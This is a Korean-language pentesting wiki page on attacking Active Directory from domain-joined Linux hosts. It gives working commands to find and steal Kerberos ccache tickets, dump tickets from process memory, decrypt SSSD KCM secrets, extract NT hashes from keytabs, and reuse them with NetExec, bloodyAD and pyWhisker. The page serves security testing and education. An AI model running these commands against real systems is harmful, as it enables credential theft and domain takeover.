# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Linux 머신도 Active Directory 환경에 존재할 수 있습니다.

AD 내의 Linux 머신은 **Kerberos 자료를 로컬에 저장**할 수 있습니다. 여기에는 사용자 ccache, 머신/서비스 keytab, SSSD가 관리하는 비밀 정보가 포함됩니다. 이러한 artefact는 보통 다른 Kerberos credential처럼 재사용할 수 있습니다. 대부분의 자료를 읽으려면 ticket의 소유자이거나 머신의 **root**여야 합니다.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## 열거

### Linux에서 AD 열거

Linux(또는 Windows의 bash)에서 AD에 접근할 수 있다면 [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn)을 사용해 AD를 열거할 수 있습니다.

다음 페이지에서 **Linux에서 AD를 열거하는 다른 방법**도 확인할 수 있습니다.


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA는 주로 **Unix** 환경을 위한 Microsoft Windows **Active Directory**의 오픈 소스 **대안**입니다. 완전한 **LDAP 디렉터리**와 MIT **Kerberos** Key Distribution Center를 결합해 Active Directory와 유사한 관리를 제공합니다. CA 및 RA 인증서 관리를 위해 Dogtag **Certificate System**을 사용하며, 스마트카드를 포함한 **다중 요소** 인증을 지원합니다. Unix 인증 프로세스에는 SSSD가 통합되어 있습니다.<sup>[[14]](#references)[[15]](#references)</sup> 자세한 내용은 다음을 참조하세요:


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### 도메인에 가입된 호스트의 artefact

ticket을 살펴보기 전에 **호스트를 AD에 가입시킨 방식**과 **Kerberos 자료가 실제로 저장된 위치**를 확인하세요. 최신 Linux 호스트에서는 일반적으로 `/tmp`의 단순한 파일만 사용하는 것이 아니라 `realmd` + `adcli` + `sssd`로 이를 처리합니다.<sup>[[10]](#references)</sup>

```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```

이는 호스트가 AD를 신뢰하는지, SSSD가 identity 또는 ticket을 캐싱하는지, 그리고 **machine/service keytab** 또는 **KCM secret**을 악용할 수 있는지 빠르게 알려줍니다.<sup>[[4]](#references)[[10]](#references)</sup>

`/var/lib/sss/db/cache_*.ldb`는 Kerberos ccache 및 `/var/lib/sss/secrets/secrets.ldb`와 별도로 다루세요. 도메인에서 `cache_credentials = true`가 설정되어 **있고** 사용자가 이전에 해당 호스트에서 인증한 경우, `cache_*.ldb` 파일에는 오프라인 password verifier가 포함될 수 있습니다. 일반적으로 이 파일은 권한이 있는 사용자만 읽을 수 있습니다. cache 파일이 있거나 설정이 활성화되어 있다는 사실만으로 현재 사용할 수 있는 password가 존재한다고 단정할 수는 없습니다. 결론을 내리기 전에 도메인별 유효 설정과 실제 캐시된 identity를 확인하세요. [Red Hat의 SSSD credential-cache 문서](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/epub/configuring_authentication_and_authorization_in_rhel/overview-single-sign-on_introduction-to-system-authentication)를 참고하세요. 별도의 Linux-to-AD identity 경계에서는 서비스가 ticket을 수락하고 principal을 관련 Unix account에 매핑하는 경우에만 [mixed-vendor Kerberos name mapping](https://www.pentestpartners.com/security-blog/a-broken-marriage-abusing-mixed-vendor-kerberos-stacks/)이 중요합니다.

`ksu`가 설치된 호스트에서 유효한 Kerberos principal로 **local target account**에 접근할 수 있으며, root도 이에 포함됩니다. 단, 해당 account가 그 principal에 권한을 부여해야 합니다. [MIT Kerberos 문서](https://web.mit.edu/Kerberos/www/krb5-latest/doc/user/user_commands/ksu.html)는 target의 홈 디렉터리에 있는 `.k5login` 및 `.k5users` 파일과 둘 다 없을 때 적용되는 name-mapping fallback을 설명합니다. `.k5users`는 `ksu -e`에서 실행할 수 있는 command를 제한할 수도 있습니다. 파일이 있다는 사실만으로 shell 접근이 가능하다고 단정할 수는 없습니다. 정확한 target account, 파일 소유권/권한, 읽을 수 있는 authorization 항목, 사용 가능한 Kerberos credential, 유효한 mapping 규칙을 확인하세요. root 홈 디렉터리에 접근할 수 없다면 authorization 상태는 알 수 없습니다. Passive enumeration에서는 ticket을 요청하거나 `ksu`를 실행하지 말고 해당 경로와 권한만 나열해야 합니다.

예약된 backup이 간접적으로 `.k5login` authorization 경계를 만들 수 있습니다. 더 높은 권한의 account가 낮은 권한 사용자가 쓸 수 있는 디렉터리를 자신의 홈 디렉터리로 재귀적으로 복사한다면, 복사에 숨김 파일이 포함되는지, 대상 경로가 해당 account의 유효한 홈 디렉터리인지, 생성된 파일의 소유권이 Kerberos login service에서 허용되는지 확인하세요. 예를 들어, [rsync 문서](https://download.samba.org/pub/rsync/rsync.1.html)에 따르면 `-a --no-owner`는 새 대상 파일의 소유자를 수신 사용자로 설정합니다. [MIT Kerberos 문서](https://web.mit.edu/kerberos/www/krb5-latest/doc/user/user_config/k5login.html)는 해당 사용자의 `.k5login`에 있는 principal이 접근을 허가하는 방식을 설명합니다. 경로가 성립하는지 판단하려면 예약 작업의 RunAs identity, source에 대한 쓰기 권한, 유효한 rsync 옵션, GSSAPI가 활성화된 login, 나열된 principal에 대한 유효한 ticket을 확인하세요. 쓰기 가능한 source 디렉터리나 예약된 rsync command만으로는 이 경로가 성립한다고 볼 수 없습니다.

읽을 수 있는 keytab도 principal별로 검토해야 합니다. 관리용 이름의 principal이 포함된 keytab만으로는 관리 권한이 입증되지 않습니다. 허용되는 principal 작업은 [KDC의 `kadm5.acl` 정책](https://web.mit.edu/Kerberos/www/krb5-1.22/doc/admin/conf_files/kadm5_acl.html)에 따라 결정됩니다. keytab 접근을 root로 가는 경로로 간주하기 전에 principal, 유효한 ACL, local `ksu` 또는 login authorization을 각각 확인하세요. Passive triage에서는 key를 사용하거나 KDC에 연결하지 않고 keytab의 경로와 권한을 나열할 수 있습니다.

## Ticket 다루기

### Pass The Ticket

이 페이지에서는 **Linux 호스트 내부에서 Kerberos ticket을 찾을 수 있는 여러 위치**를 확인할 수 있습니다. 다음 페이지에서는 이러한 CCache ticket 형식을 Kirbi(Windows에서 사용해야 하는 형식)로 변환하는 방법과 PTT attack을 수행하는 방법을 알아볼 수 있습니다:


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

**Linux 전용 ticket harvesting workflow**(`FILE`, `DIR`, `KEYRING`, `KCM`, `/proc` 등)를 확인하려면 전용 페이지를 참고하세요:

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### /tmp에서 CCACHE ticket 재사용하기

CCACHE 파일은 **Kerberos credential을 저장하기 위한** binary 형식입니다. `FILE:/tmp/krb5cc_%{uid}`가 여전히 흔하지만, 최신 Linux 배포판에서는 `DIR:/run/user/%{uid}/krb5cc*`, `KEYRING:persistent:%{uid}` 또는 `KCM:%{uid}`도 사용합니다. ticket이 `/tmp`에 있다고 가정하기 전에 **`KRB5CCNAME`** 환경 변수와 `default_ccache_name` 설정을 확인하세요.<sup>[[1]](#references)[[3]](#references)</sup>

```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```

### CCACHE 티켓의 keyring 재사용

**프로세스 메모리에 저장된 Kerberos 티켓은 추출할 수 있습니다.** 특히 머신에서 ptrace 보호(`/proc/sys/kernel/yama/ptrace_scope`)가 비활성화된 경우 더욱 그렇습니다. 이 작업에 유용한 도구는 [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)에서 찾을 수 있습니다. 이 도구는 세션에 inject하고 티켓을 `/tmp`에 덤프하여 추출을 용이하게 합니다.<sup>[[1]](#references)[[16]](#references)</sup>

이 도구를 구성하고 사용하는 방법은 다음과 같습니다:

```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```

이 절차는 다양한 세션에 주입을 시도하며, 추출한 티켓을 `/tmp`에 `__krb_UID.ccache`라는 명명 규칙으로 저장해 성공 여부를 나타냅니다.<sup>[[1]](#references)</sup>

### SSSD KCM에서 CCACHE 티켓 재사용

SSSD는 `/var/lib/sss/secrets/secrets.ldb` 경로에 데이터베이스 사본을 유지합니다. 이에 해당하는 키는 `/var/lib/sss/secrets/.secrets.mkey` 경로의 숨김 파일에 저장됩니다. 기본적으로 이 키는 **root** 권한이 있어야 읽을 수 있습니다.<sup>[[4]](#references)</sup>

**`SSSDKCMExtractor`**를 --database 및 --key 매개변수와 함께 실행하면 데이터베이스를 파싱하고 **secrets를 복호화**합니다.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```

Extractor는 raw Kerberos JSON payload를 출력하므로, pass-the-cache/pass-the-ticket 작업 전에 이를 사용할 수 있는 ticket cache 또는 다른 ticket 형식으로 변환하세요.<sup>[[4]](#references)</sup>

### Quick keytab triage

```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```

### /etc/krb5.keytab에서 계정 추출

root 권한으로 실행되는 서비스에 필수적인 서비스 계정 키는 **`/etc/krb5.keytab`** 파일에 안전하게 저장됩니다. 서비스의 비밀번호와 같은 역할을 하는 이 키는 엄격하게 기밀로 유지해야 합니다.<sup>[[5]](#references)</sup>

keytab 파일의 내용을 확인할 때는 **`klist`**를 사용할 수 있습니다. Linux에서 `klist -k -K -e`를 실행하면 principals, 키 버전 번호, 암호화 유형, 원시 키 자료가 출력됩니다. 키 유형이 **23 / RC4-HMAC**이면 키 값은 해당 principal의 **NT hash**이기도 합니다.<sup>[[6]](#references)[[17]](#references)</sup>

```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```

Linux 사용자의 경우 **`KeyTabExtract`**를 사용해 RC4 HMAC hash를 추출할 수 있으며, 이를 NTLM hash 재사용에 활용할 수 있습니다. 단, keytab에 **etype 23 / RC4-HMAC** 자료가 여전히 포함된 경우에만 유용합니다. **AES 전용** 환경에서는 재사용 가능한 NT hash를 얻지 못할 수 있지만, Kerberos를 통해 keytab으로 직접 인증할 수는 있습니다.<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```

macOS에서 **`bifrost`**는 keytab 파일 분석 도구로 사용됩니다.<sup>[[8]](#references)</sup>

```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```

추출한 계정 및 해시 정보를 활용하면 **`NetExec`**와 같은 도구를 사용해 서버에 연결할 수 있습니다.<sup>[[9]](#references)</sup>

```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```

### `/etc/krb5.keytab`의 컴퓨터 계정 재사용

`realmd`/`adcli`/`sssd`를 사용해 도메인에 가입한 시스템에서는 `/etc/krb5.keytab`에 보통 **컴퓨터 계정**과 하나 이상의 **호스트/서비스 principal**이 들어 있습니다. **root** 권한이 있다면 파일 내용을 그냥 덤프하지 마세요. `klist -k`에 나열된 principal 중 하나를 사용해 TGT를 요청하고 Linux 호스트 자체로 작업하세요.<sup>[[10]](#references)</sup>

```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```

이는 **computer object** 자체에 AD에서 위임된 권한이 있거나, 호스트가 **gMSA**와 같은 다른 secret을 가져올 수 있도록 허용된 경우 특히 유용합니다.<sup>[[13]](#references)</sup>

### Linux 우선 AD 도구를 사용해 탈취한 Kerberos 자료 재사용

유효한 `ccache` 또는 사용할 수 있는 keytab이 있으면, 먼저 모든 것을 Windows 형식으로 변환하지 않고도 **Linux에서 직접** AD를 대상으로 작업할 수 있습니다. 많은 최신 도구가 `KRB5CCNAME` 및 Kerberos 인증을 기본적으로 지원합니다.<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>

```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
  --target 'WEB01$' --action list
```

이는 **Linux post-exploitation**과 **AD object abuse**를 잇는 좋은 연결 지점입니다. 객체 수준의 abuse 경로 자체에 대해서는 다음을 확인하세요.

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account 아티팩트

최근 Linux 배포 환경에서는 AD에서 **Managed Service Accounts**를 직접 사용할 수 있습니다. 실제로 이는 Linux 서버를 침해한 뒤 호스트 keytab뿐 아니라 gMSA에서 생성된 **서비스별 keytab**도 찾을 수 있다는 뜻입니다. `/etc/gmsad.conf`, 배포 환경별 설정 파일, `/etc` 아래의 추가 `*.keytab` 파일이 일반적인 점검 위치입니다.<sup>[[2]](#references)[[13]](#references)</sup>

```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```

이렇게 하면 **Windows 엔드포인트를 전혀 건드리지 않고도** 해당 gMSA에 바인딩된 SPN에 사용할 재사용 가능한 Kerberos identity를 얻을 수 있습니다.<sup>[[13]](#references)</sup> AD에서 더 높은 권한을 얻은 후의 **도메인 측** gMSA/dMSA 악용 방법은 다음을 확인하세요.

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos (II): Kerberos를 공격하는 방법은?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [관리형 서비스 계정으로 AD에 액세스하기 – RHEL 시스템을 Active Directory에 직접 통합하기](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Kerberos 환경 변수 – MIT Kerberos 문서](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – MIT Kerberos 문서](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757: Microsoft Windows에서 사용하는 RC4-HMAC Kerberos 암호화 유형](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [Kerberos 사용 | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [ID 도메인 검색 및 가입 | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [bloodyAD 사용자 가이드](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [소개 | FreeIPA 문서](https://www.freeipa.org/About.html)
- [15] [FreeIPA 4.11.0 릴리스 노트](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – Linux 커널 문서](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – MIT Kerberos 문서](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
